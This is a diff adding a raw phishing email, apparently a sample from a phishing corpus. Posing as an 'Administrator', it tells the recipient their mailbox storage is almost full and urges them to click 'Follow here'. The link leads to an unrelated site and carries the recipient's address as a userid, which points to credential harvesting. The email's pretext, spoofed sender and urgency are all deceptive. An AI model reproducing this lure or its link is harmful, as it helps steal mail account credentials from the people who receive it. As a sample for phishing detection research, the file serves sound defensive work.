@@ -1,0 +1,104 @@
+Return-Path: annie@isec.ac.in
+Delivered-To: jose@monkey.org
+X-FDA: 71123838072.04.cast67_3f492ac7ba348
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 50,0,0,70bdf329b87e3aa2,d41d8cd98f00b204,annie@isec.ac.in,:,RULES_HIT:41:72:355:379:495:800:962:967:973:983:988:989:1147:1189:1208:1221:1260:1261:1263:1313:1314:1345:1381:1431:1433:1434:1436:1437:1516:1517:1518:1534:1542:1561:1571:1575:1588:1589:1592:1594:1686:1710:1711:1714:1730:1749:1776:1792:2198:2199:2525:2527:2560:2563:2610:2682:2685:2693:2859:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3362:3586:3867:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:5007:6261:6703:7784:7903:8513:8518:8599:8603:8784:8987:9025:9388:10004:10044:10049:10346:10400:11527:11658:11914:12043:12517:12519:12555:12764:13025:13071:13139:13146:13230:13237:13975:14051:14093:14096:21080,0,RBL:error,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0,LFtime:71,LUA_SUMMARY:none
+X-HE-Tag: cast67_3f492ac7ba348
+X-Filterd-Recvd-Size: 4443
+Received: from mailhost.isec.ac.in (isec.ac.in [203.200.22.246])
+	by imf20.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 28 Jan 2016 02:50:34 +0000 (UTC)
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mailhost.isec.ac.in (Postfix) with ESMTP id 6E56E2AACDA1
+	for <jose@monkey.org>; Thu, 28 Jan 2016 08:29:33 +0530 (IST)
+X-Virus-Scanned: amavisd-new at isec.ac.in
+Received: from mailhost.isec.ac.in ([127.0.0.1])
+	by localhost (mailhost.isec.ac.in [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id FvC2KfqQ1feD for <jose@monkey.org>;
+	Thu, 28 Jan 2016 08:29:32 +0530 (IST)
+Received: from SM-MXME-OMSEXTRANET.wdcb2b.com (unknown [201.149.9.234])
+	by mailhost.isec.ac.in (Postfix) with ESMTPSA id CB2712AACDF6
+	for <jose@monkey.org>; Thu, 28 Jan 2016 08:29:31 +0530 (IST)
+Content-Type: multipart/alternative; boundary="===============2100378743=="
+MIME-Version: 1.0
+Subject: {jose@monkey.org} Storage Exceeded
+To: jose@monkey.org
+From: Administrator <annie@isec.ac.in>
+Date: Wed, 27 Jan 2016 20:50:28 -0600
+Message-Id: <20160128025931.CB2712AACDF6@mailhost.isec.ac.in>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 34
+
+You will not see this in a MIME-aware mail reader.
+--===============2100378743==
+Content-Type: text/plain; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+
+  You will soon exceed your limit.
+
+Hello {jose@monkey.org} =
+
+   4560MB	  	 5096MB =
+
+  Current size	  	 Maximum size
+ Your jose@monkey.org will soon exceeds its limit, you are advised to clean=
+ up by deleting unwanted files to increase your jose@monkey.org space witho=
+ut losing any files Follow here.    Thanks,  Administrator.
+--===============2100378743==
+Content-Type: text/html; charset="iso-8859-1"
+MIME-Version: 1.0
+Content-Transfer-Encoding: quoted-printable
+Content-Description: Mail message body
+
+<HTML><head><meta http-equiv=3D"Content-Type" content=3D"text/html; charset=
+=3Diso-8859-1"/></head><BODY><BR>
+<DIV>
+<DIV><FONT color=3D#000066 size=3D3 face=3DArial><B>You will soon exceed&nb=
+sp;your limit.</B></FONT><BR><BR><FONT face=3D"Courier New">Hello&nbsp;{jos=
+e@monkey.org}</FONT></DIV>
+<TABLE cellSpacing=3D0>
+<TBODY>
+<TR>
+<TD style=3D"BORDER-TOP: black 1px solid; BORDER-RIGHT-WIDTH: 1px; WIDTH: 1=
+87px; BORDER-BOTTOM: black 1px solid; BORDER-LEFT: black 1px solid; BORDER-=
+RIGHT-COLOR: black; BACKGROUND-COLOR: #ffcc00" width=3D187><SPAN style=3D"B=
+ACKGROUND-COLOR: #ffcc00"><FONT color=3Dblack size=3D2>4560MB</FONT></SPAN>=
+</TD>
+<TD style=3D"BORDER-LEFT-WIDTH: 1px; BORDER-TOP: black 1px solid; BORDER-RI=
+GHT: black 1px solid; WIDTH: 13px; BORDER-BOTTOM: black 1px solid; BORDER-L=
+EFT-COLOR: black; BACKGROUND-COLOR: white" width=3D13><SPAN style=3D"BACKGR=
+OUND-COLOR: white">&nbsp;</SPAN></TD>
+<TD><FONT color=3Dblack size=3D2><B>5096</B></FONT><FONT color=3Dblack size=
+=3D2>MB </FONT></TD></TR>
+<TR>
+<TD style=3D"WIDTH: 187px" width=3D187><FONT color=3Dwhite size=3D1>Current=
+ size</FONT></TD>
+<TD style=3D"WIDTH: 13px" width=3D13>&nbsp;</TD>
+<TD><FONT color=3Dwhite size=3D1>Maximum size</FONT></TD></TR></TBODY></TAB=
+LE>
+<DIV><FONT color=3Dblack face=3DTahoma><SPAN style=3D"TEXT-TRANSFORM: none;=
+ BACKGROUND-COLOR: white">Your&nbsp;jose@monkey.org will soon exceeds its&n=
+bsp;limit, you are advised to clean up by deleting unwanted files to increa=
+se your&nbsp;jose@monkey.org&nbsp;space without losing any files</SPAN></FO=
+NT><FONT color=3Dblack size=3D4 face=3D"Courier New">&nbsp;</FONT><A href=
+=3D"http://subornobhumi.com/tk/hbb/hbb/hbb/index.php?userid=3Djose@monkey.o=
+rg" target=3D_blank><FONT size=3D2 face=3DTahoma><FONT size=3D4 face=3D"Cou=
+rier New">Follow here</FONT></FONT></A><FONT color=3Dblack size=3D4 face=3D=
+"Courier New">.</FONT></DIV></DIV>
+<DIV style=3D"BACKGROUND-COLOR: white"><SPAN style=3D"BACKGROUND-COLOR: whi=
+te"><FONT color=3Dblack><B>&nbsp;</B></FONT><FONT color=3D#333333>&nbsp;</F=
+ONT></SPAN></DIV>
+<DIV style=3D"BACKGROUND-COLOR: white"><SPAN style=3D"BACKGROUND-COLOR: whi=
+te"><FONT color=3Dblack face=3D"Courier New"><B>Thanks,</B></FONT><FONT col=
+or=3D#333333 face=3D"Courier New">&nbsp;</FONT></SPAN></DIV>
+<DIV style=3D"BACKGROUND-COLOR: white"><SPAN style=3D"BACKGROUND-COLOR: whi=
+te"><FONT color=3Dblack face=3D"Courier New"><B>Administrator.</B></FONT></=
+SPAN></DIV></BODY></HTML>
+--===============2100378743==--
